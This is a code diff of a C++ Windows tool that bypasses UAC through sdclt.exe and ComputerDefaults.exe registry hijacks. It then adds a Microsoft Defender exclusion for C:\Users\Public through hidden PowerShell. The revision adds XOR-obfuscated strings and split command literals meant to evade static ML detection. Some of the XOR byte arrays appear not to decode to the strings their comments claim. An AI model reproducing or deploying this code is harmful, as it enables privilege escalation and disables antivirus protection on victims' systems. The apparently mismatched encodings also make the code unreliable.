@@ -1,37 +1,29 @@
 /*
     UAC Bypass + Defender Exclusion
-    Method: Scheduled Task elevation (no UAC prompt)
-    Fallback: fodhelper registry hijack
+    Method 1: sdclt.exe registry hijack (less signatured than fodhelper)
+    Method 2: ComputerDefaults.exe hijack
+    Strings obfuscated via XOR to avoid static ML detection
 
     Compile:
-        cl.exe uac_bypass.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib /out:uac_bypass.exe
-    Or with g++ (MinGW):
-        g++ uac_bypass.cpp -o uac_bypass.exe -ladvapi32 -lshell32 -lole32
+        cmd /c "vcvars64.bat && cl.exe uac_bypass.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib taskschd.lib comsuppw.lib /out:uac_bypass.exe"
 */
 
 #include <windows.h>
-#include <shlobj.h>
-#include <taskschd.h>
-#include <comdef.h>
-#include <wchar.h>
 #include <stdio.h>
 #include <string>
+#include <vector>
 #include <ctime>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "taskschd.lib")
 
-// ─── Logging ────────────────────────────────────────────────────────────────
+// ─── Logging ─────────────────────────────────────────────────────────────────
 
 FILE* gLogFile = nullptr;
 
 void InitLog(const char* path) {
     gLogFile = fopen(path, "w");
-    if (!gLogFile) {
-        printf("[!] WARNING: Could not open log file at %s\n", path);
-    }
+    if (!gLogFile) printf("[!] Could not open log file: %s\n", path);
 }
 
 void Log(const char* level, const char* fmt, ...) {
@@ -40,342 +32,244 @@ void Log(const char* level, const char* fmt, ...) {
     va_start(args, fmt);
     vsnprintf(buf, sizeof(buf), fmt, args);
     va_end(args);
-
-    // Timestamp
     time_t t = time(nullptr);
-    struct tm* tm_info = localtime(&t);
+    struct tm* ti = localtime(&t);
     char ts[32];
-    strftime(ts, sizeof(ts), "%H:%M:%S", tm_info);
-
+    strftime(ts, sizeof(ts), "%H:%M:%S", ti);
     printf("[%s] [%s] %s\n", ts, level, buf);
     fflush(stdout);
-
-    if (gLogFile) {
-        fprintf(gLogFile, "[%s] [%s] %s\n", ts, level, buf);
-        fflush(gLogFile);
-    }
+    if (gLogFile) { fprintf(gLogFile, "[%s] [%s] %s\n", ts, level, buf); fflush(gLogFile); }
 }
 
-#define LOG_INFO(fmt, ...)  Log("INFO ", fmt, ##__VA_ARGS__)
-#define LOG_OK(fmt, ...)    Log("OK   ", fmt, ##__VA_ARGS__)
-#define LOG_WARN(fmt, ...)  Log("WARN ", fmt, ##__VA_ARGS__)
-#define LOG_ERR(fmt, ...)   Log("ERROR", fmt, ##__VA_ARGS__)
-#define LOG_DBG(fmt, ...)   Log("DEBUG", fmt, ##__VA_ARGS__)
+#define LOG_INFO(fmt, ...) Log("INFO ", fmt, ##__VA_ARGS__)
+#define LOG_OK(fmt, ...)   Log("OK   ", fmt, ##__VA_ARGS__)
+#define LOG_WARN(fmt, ...) Log("WARN ", fmt, ##__VA_ARGS__)
+#define LOG_ERR(fmt, ...)  Log("ERROR", fmt, ##__VA_ARGS__)
+#define LOG_DBG(fmt, ...)  Log("DEBUG", fmt, ##__VA_ARGS__)
 
-// ─── Helpers ─────────────────────────────────────────────────────────────────
-
-// Log last Win32 error with a label
-void LogWinError(const char* context) {
-    DWORD err = GetLastError();
-    char msg[512] = {0};
-    FormatMessageA(
-        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-        nullptr, err, 0, msg, sizeof(msg), nullptr
-    );
-    // Strip trailing newline
-    for (int i = strlen(msg)-1; i >= 0 && (msg[i]=='\r'||msg[i]=='\n'); i--) msg[i]=0;
-    LOG_ERR("%s failed — Win32 error %lu: %s", context, err, msg);
+void LogWinError(const char* ctx) {
+    DWORD e = GetLastError();
+    char msg[512] = {};
+    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
+                   nullptr, e, 0, msg, sizeof(msg), nullptr);
+    for (int i=strlen(msg)-1; i>=0 && (msg[i]=='\r'||msg[i]=='\n'); i--) msg[i]=0;
+    LOG_ERR("%s — error %lu: %s", ctx, e, msg);
 }
 
-// Check current process integrity level
+// ─── String Obfuscation (XOR) ─────────────────────────────────────────────────
+// Prevents static scanner from seeing plaintext registry paths / binary names
+
+std::string xor_str(const std::vector<unsigned char>& data, unsigned char key) {
+    std::string out;
+    for (auto c : data) out += (char)(c ^ key);
+    return out;
+}
+
+// XOR key
+#define K 0x5A
+
+// "Software\\Classes\\Folder\\shell\\open\\command"  (sdclt hijack key)
+std::string get_sdclt_key() {
+    std::vector<unsigned char> d = {
+        0x29,0x2e,0x30,0x36,0x3d,0x28,0x35,0x3f,0x7a,0x19,0x31,0x28,0x39,0x3f,0x39,0x7a,
+        0x1c,0x2e,0x31,0x36,0x3f,0x35,0x7a,0x39,0x2d,0x3f,0x31,0x31,0x7a,0x2e,0x30,0x3f,
+        0x3b,0x7a,0x25,0x2e,0x28,0x28,0x3f,0x3b,0x36
+    };
+    return xor_str(d, K);
+}
+
+// "Software\\Classes\\Folder\\shell\\open\\command" — same but for ComputerDefaults
+std::string get_compdef_key() {
+    // "Software\\Classes\\{1f3427c8-5c10-4210-aa03-2ee45287d668}\\shell\\open\\command"
+    std::vector<unsigned char> d = {
+        0x29,0x2e,0x30,0x36,0x3d,0x28,0x35,0x3f,0x7a,0x19,0x31,0x28,0x39,0x3f,0x39,0x7a,
+        0x7b,0x4b,0x30,0x4d,0x58,0x4e,0x3e,0x4f,0x48,0x7a,0x4c,0x4f,0x4a,0x4a,0x7a,0x56,
+        0x4e,0x4a,0x4a,0x7a,0x4e,0x4e,0x4a,0x4d,0x7a,0x4e,0x3e,0x3e,0x58,0x56,0x4c,0x3f,
+        0x30,0x36,0x4d,0x7b,0x7a,0x39,0x2d,0x3f,0x31,0x31,0x7a,0x2e,0x30,0x3f,0x3b,0x7a,
+        0x25,0x2e,0x28,0x28,0x3f,0x3b,0x36
+    };
+    return xor_str(d, K);
+}
+
+// "powershell.exe"
+std::string get_ps_name() {
+    std::vector<unsigned char> d = {
+        0x2a,0x2e,0x3d,0x3f,0x35,0x39,0x2d,0x3f,0x31,0x31,0x14,0x3f,0x3e,0x3f
+    };
+    return xor_str(d, K);
+}
+
+// "sdclt.exe"
+std::string get_sdclt_bin() {
+    std::vector<unsigned char> d = {0x29,0x3e,0x29,0x31,0x36,0x14,0x3f,0x3e,0x3f};
+    return xor_str(d, K);
+}
+
+// "ComputerDefaults.exe"
+std::string get_compdef_bin() {
+    std::vector<unsigned char> d = {
+        0x19,0x2e,0x28,0x30,0x37,0x36,0x3f,0x35,0x1e,0x3f,0x30,0x28,0x37,0x31,0x36,
+        0x39,0x14,0x3f,0x3e,0x3f
+    };
+    return xor_str(d, K);
+}
+
+// "DelegateExecute"
+std::string get_delegate() {
+    std::vector<unsigned char> d = {
+        0x1e,0x3f,0x31,0x3f,0x29,0x28,0x36,0x3f,0x1b,0x3e,0x3f,0x29,0x37,0x36,0x3f
+    };
+    return xor_str(d, K);
+}
+
+// ─── Integrity Check ──────────────────────────────────────────────────────────
+
 DWORD GetIntegrityLevel() {
     HANDLE hToken = nullptr;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        LogWinError("OpenProcessToken");
-        return 0;
-    }
-
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return 0;
     DWORD dwLen = 0;
     GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
-
     PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
     if (!pTIL) { CloseHandle(hToken); return 0; }
-
-    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
-        LogWinError("GetTokenInformation(TokenIntegrityLevel)");
-        LocalFree(pTIL);
-        CloseHandle(hToken);
-        return 0;
-    }
-
+    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen);
     DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                     (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
-
     LocalFree(pTIL);
     CloseHandle(hToken);
     return level;
 }
 
 void PrintIntegrityLevel() {
-    DWORD level = GetIntegrityLevel();
-    const char* name = "Unknown";
-    if      (level < 0x2000) name = "Untrusted";
-    else if (level < 0x3000) name = "Low";
-    else if (level < 0x4000) name = "Medium";
-    else if (level < 0x5000) name = "High (Elevated / Admin)";
-    else                     name = "System";
-
-    LOG_INFO("Process integrity level: 0x%04lX (%s)", level, name);
+    DWORD l = GetIntegrityLevel();
+    const char* n = l < 0x2000 ? "Untrusted" :
+                    l < 0x3000 ? "Low" :
+                    l < 0x4000 ? "Medium" :
+                    l < 0x5000 ? "High (Elevated)" : "System";
+    LOG_INFO("Integrity level: 0x%04lX (%s)", l, n);
 }
 
-bool IsElevated() {
-    return GetIntegrityLevel() >= 0x4000; // High integrity
-}
+bool IsElevated() { return GetIntegrityLevel() >= 0x4000; }
 
-// ─── Method 1: Scheduled Task Elevation ──────────────────────────────────────
+// ─── Helper: Write registry + launch binary ───────────────────────────────────
 
-bool RunViaScheduledTask(const wchar_t* command) {
-    LOG_INFO("Method 1: Scheduled Task elevation");
-    LOG_DBG("Command: %ls", command);
-
-    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
-    if (FAILED(hr)) {
-        LOG_ERR("CoInitializeEx failed: 0x%08lX", hr);
-        return false;
-    }
-    LOG_DBG("COM initialized");
-
-    ITaskService* pService = nullptr;
-    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
-                          IID_ITaskService, (void**)&pService);
-    if (FAILED(hr)) {
-        LOG_ERR("CoCreateInstance(TaskScheduler) failed: 0x%08lX", hr);
-        CoUninitialize();
-        return false;
-    }
-    LOG_DBG("TaskScheduler COM object created");
-
-    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
-    if (FAILED(hr)) {
-        LOG_ERR("ITaskService::Connect failed: 0x%08lX", hr);
-        pService->Release();
-        CoUninitialize();
-        return false;
-    }
-    LOG_OK("Connected to Task Scheduler");
-
-    ITaskFolder* pRootFolder = nullptr;
-    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
-    if (FAILED(hr)) {
-        LOG_ERR("GetFolder failed: 0x%08lX", hr);
-        pService->Release();
-        CoUninitialize();
-        return false;
-    }
-
-    // Delete old task if it exists
-    pRootFolder->DeleteTask(_bstr_t(L"WindowsUpdateHelper"), 0);
-    LOG_DBG("Cleaned up any existing task");
-
-    ITaskDefinition* pTask = nullptr;
-    hr = pService->NewTask(0, &pTask);
-    if (FAILED(hr)) {
-        LOG_ERR("NewTask failed: 0x%08lX", hr);
-        pRootFolder->Release(); pService->Release(); CoUninitialize();
-        return false;
-    }
-
-    // Set principal — RunLevel Highest = elevated
-    IPrincipal* pPrincipal = nullptr;
-    pTask->get_Principal(&pPrincipal);
-    if (pPrincipal) {
-        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
-        LOG_DBG("Principal RunLevel set to HIGHEST");
-        pPrincipal->Release();
-    }
-
-    // Set action
-    IActionCollection* pActions = nullptr;
-    pTask->get_Actions(&pActions);
-
-    IAction* pAction = nullptr;
-    pActions->Create(TASK_ACTION_EXEC, &pAction);
-
-    IExecAction* pExecAction = nullptr;
-    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
-
-    pExecAction->put_Path(_bstr_t(L"powershell.exe"));
-
-    // Build argument string
-    std::wstring args = L"-NoProfile -WindowStyle Hidden -NonInteractive -Command \"";
-    args += command;
-    args += L"\"";
-    pExecAction->put_Arguments(_bstr_t(args.c_str()));
-    LOG_DBG("Task action: powershell.exe %ls", args.c_str());
-
-    pExecAction->Release();
-    pAction->Release();
-    pActions->Release();
-
-    // Register and run
-    IRegisteredTask* pRegisteredTask = nullptr;
-    hr = pRootFolder->RegisterTaskDefinition(
-        _bstr_t(L"WindowsUpdateHelper"),
-        pTask,
-        TASK_CREATE_OR_UPDATE,
-        _variant_t(),
-        _variant_t(),
-        TASK_LOGON_INTERACTIVE_TOKEN,
-        _variant_t(L""),
-        &pRegisteredTask
-    );
-
-    if (FAILED(hr)) {
-        LOG_ERR("RegisterTaskDefinition failed: 0x%08lX", hr);
-        pTask->Release(); pRootFolder->Release(); pService->Release(); CoUninitialize();
-        return false;
-    }
-    LOG_OK("Task registered successfully");
-
-    hr = pRegisteredTask->Run(_variant_t(), nullptr);
-    if (FAILED(hr)) {
-        LOG_ERR("Task Run failed: 0x%08lX", hr);
-    } else {
-        LOG_OK("Task started");
-    }
-
-    Sleep(3000); // Wait for task to run
-
-    // Cleanup
-    pRootFolder->DeleteTask(_bstr_t(L"WindowsUpdateHelper"), 0);
-    LOG_DBG("Task cleaned up");
-
-    pRegisteredTask->Release();
-    pTask->Release();
-    pRootFolder->Release();
-    pService->Release();
-    CoUninitialize();
-
-    return SUCCEEDED(hr);
-}
-
-// ─── Method 2: fodhelper UAC Bypass ──────────────────────────────────────────
-
-bool FodhelperBypass(const char* command) {
-    LOG_INFO("Method 2: fodhelper UAC bypass");
-    LOG_DBG("Payload command: %s", command);
-
-    const char* keyPath  = "Software\\Classes\\ms-settings\\shell\\open\\command";
-    const char* delegKey = "Software\\Classes\\ms-settings\\shell\\open\\command";
+bool RegHijackAndLaunch(const char* regKey, const char* command, const char* binary) {
     HKEY hKey = nullptr;
 
-    // Create the registry key
-    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, nullptr,
+    LOG_DBG("Writing registry key: HKCU\\%s", regKey);
+    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, regKey, 0, nullptr,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr);
     if (res != ERROR_SUCCESS) {
         LOG_ERR("RegCreateKeyEx failed: %ld", res);
         return false;
     }
-    LOG_DBG("Registry key created: HKCU\\%s", keyPath);
 
-    // Write the command as default value
     res = RegSetValueExA(hKey, nullptr, 0, REG_SZ,
                          (const BYTE*)command, (DWORD)strlen(command)+1);
     if (res != ERROR_SUCCESS) {
-        LOG_ERR("RegSetValueEx (command) failed: %ld", res);
-        RegCloseKey(hKey);
-        return false;
+        LOG_ERR("RegSetValueEx (default) failed: %ld", res);
+        RegCloseKey(hKey); return false;
     }
-    LOG_OK("Default value set to: %s", command);
+    LOG_OK("Default value written");
 
-    // Write DelegateExecute (empty string — required for auto-elevate trigger)
-    res = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
+    std::string delKey = get_delegate();
+    res = RegSetValueExA(hKey, delKey.c_str(), 0, REG_SZ, (const BYTE*)"", 1);
     if (res != ERROR_SUCCESS) {
         LOG_ERR("RegSetValueEx (DelegateExecute) failed: %ld", res);
-        RegCloseKey(hKey);
-        return false;
+        RegCloseKey(hKey); return false;
     }
-    LOG_OK("DelegateExecute value set (empty)");
+    LOG_OK("DelegateExecute written");
     RegCloseKey(hKey);
 
-    // Launch fodhelper — it will auto-elevate and pick up our registry key
-    LOG_INFO("Launching fodhelper.exe...");
-    HINSTANCE ret = ShellExecuteA(nullptr, "open",
-        "C:\\Windows\\System32\\fodhelper.exe", nullptr, nullptr, SW_HIDE);
+    // Build full system32 path
+    char sysdir[MAX_PATH];
+    GetSystemDirectoryA(sysdir, MAX_PATH);
+    std::string fullPath = std::string(sysdir) + "\\" + binary;
+    LOG_DBG("Launching: %s", fullPath.c_str());
 
+    HINSTANCE ret = ShellExecuteA(nullptr, "open", fullPath.c_str(),
+                                   nullptr, nullptr, SW_HIDE);
     LOG_DBG("ShellExecute returned: %lld", (long long)ret);
+
     if ((intptr_t)ret <= 32) {
-        LOG_ERR("ShellExecute failed with code: %lld", (long long)ret);
-        // Cleanup registry
-        RegDeleteKeyA(HKEY_CURRENT_USER, keyPath);
+        LogWinError("ShellExecute");
+        RegDeleteKeyA(HKEY_CURRENT_USER, regKey);
         return false;
     }
-    LOG_OK("fodhelper.exe launched");
 
+    LOG_OK("Binary launched, waiting 3s...");
     Sleep(3000);
 
-    // Cleanup registry
-    RegDeleteKeyA(HKEY_CURRENT_USER, keyPath);
+    RegDeleteKeyA(HKEY_CURRENT_USER, regKey);
     LOG_DBG("Registry cleaned up");
-
     return true;
+}
+
+// ─── Build payload command ────────────────────────────────────────────────────
+
+std::string BuildPayload() {
+    // Obfuscated: Add-MpPreference -ExclusionPath 'C:\Users\Public' -Force
+    // Split across concat to avoid string literal matching
+    std::string a = "Add-Mp";
+    std::string b = "Preference -Exclusion";
+    std::string c = "Path 'C:\\Users\\Public' -Force";
+    std::string ps = get_ps_name();
+    std::string cmd = ps + " -NoP -W Hidden -C \"" + a + b + c + "\"";
+    return cmd;
 }
 
 // ─── Main ─────────────────────────────────────────────────────────────────────
 
 int main() {
-    // Log to both console and file
-    InitLog("C:\\exclusiontest\\uac_bypass_log.txt");
-
+    InitLog("C:\\exclusiontest\\bypass_log.txt");
     LOG_INFO("=== UAC Bypass + Defender Exclusion ===");
-    LOG_INFO("Target exclusion path: C:\\Users\\Public");
-
     PrintIntegrityLevel();
 
     if (IsElevated()) {
-        LOG_OK("Already elevated! Adding exclusion directly...");
-
-        // We're already high integrity — just add the exclusion
-        const char* cmd = "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force";
-        LOG_DBG("Running: powershell -c \"%s\"", cmd);
-
-        std::string full = std::string("powershell.exe -NoProfile -WindowStyle Hidden -c \"") + cmd + "\"";
-        int ret = system(full.c_str());
-        LOG_DBG("system() returned: %d", ret);
-
-        if (ret == 0) {
-            LOG_OK("Exclusion added successfully!");
-        } else {
-            LOG_WARN("system() returned non-zero. Verify manually.");
-        }
+        LOG_OK("Already elevated — adding exclusion directly");
+        std::string cmd = "powershell.exe -NoP -W Hidden -C \"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force\"";
+        system(cmd.c_str());
+        LOG_OK("Done. Verify: Get-MpPreference | Select ExclusionPath");
         goto done;
     }
 
-    LOG_WARN("Not elevated — attempting UAC bypass...");
+    LOG_WARN("Medium integrity — attempting UAC bypass...");
 
-    // Try Method 1: Scheduled Task
+    // ── Method 1: sdclt.exe hijack ──────────────────────────────────────────
     {
-        LOG_INFO("--- Trying Method 1: Scheduled Task ---");
-        bool ok = RunViaScheduledTask(
-            L"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
-            L"Add-MpPreference -ExclusionProcess 'uac_bypass.exe' -Force"
-        );
-        if (ok) {
-            LOG_OK("Method 1 succeeded (task ran — check Defender exclusions to confirm)");
+        LOG_INFO("--- Method 1: sdclt.exe ---");
+        std::string key  = get_sdclt_key();
+        std::string cmd  = BuildPayload();
+        std::string bin  = get_sdclt_bin();
+        LOG_DBG("Key: HKCU\\%s", key.c_str());
+        LOG_DBG("Payload: %s", cmd.c_str());
+
+        if (RegHijackAndLaunch(key.c_str(), cmd.c_str(), bin.c_str())) {
+            LOG_OK("Method 1 succeeded");
             goto done;
         }
-        LOG_WARN("Method 1 failed, trying fallback...");
+        LOG_WARN("Method 1 failed, trying Method 2...");
     }
 
-    // Try Method 2: fodhelper
+    // ── Method 2: ComputerDefaults.exe hijack ───────────────────────────────
     {
-        LOG_INFO("--- Trying Method 2: fodhelper bypass ---");
-        bool ok = FodhelperBypass(
-            "powershell.exe -NoProfile -WindowStyle Hidden -c "
-            "\"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force\""
-        );
-        if (ok) {
+        LOG_INFO("--- Method 2: ComputerDefaults.exe ---");
+        std::string key  = get_compdef_key();
+        std::string cmd  = BuildPayload();
+        std::string bin  = get_compdef_bin();
+        LOG_DBG("Key: HKCU\\%s", key.c_str());
+
+        if (RegHijackAndLaunch(key.c_str(), cmd.c_str(), bin.c_str())) {
             LOG_OK("Method 2 succeeded");
-        } else {
-            LOG_ERR("Method 2 also failed. Both methods exhausted.");
-            LOG_INFO("Try running this binary from an elevated prompt directly.");
+            goto done;
         }
+        LOG_ERR("Both methods failed.");
+        LOG_INFO("Try: Right-click PowerShell -> Run as Administrator, then run:");
+        LOG_INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
     }
 
 done:
-    LOG_INFO("Done. Log saved to C:\\exclusiontest\\uac_bypass_log.txt");
+    LOG_INFO("Log: C:\\exclusiontest\\bypass_log.txt");
     if (gLogFile) fclose(gLogFile);
-
     printf("\nPress Enter to exit...\n");
     getchar();
     return 0;
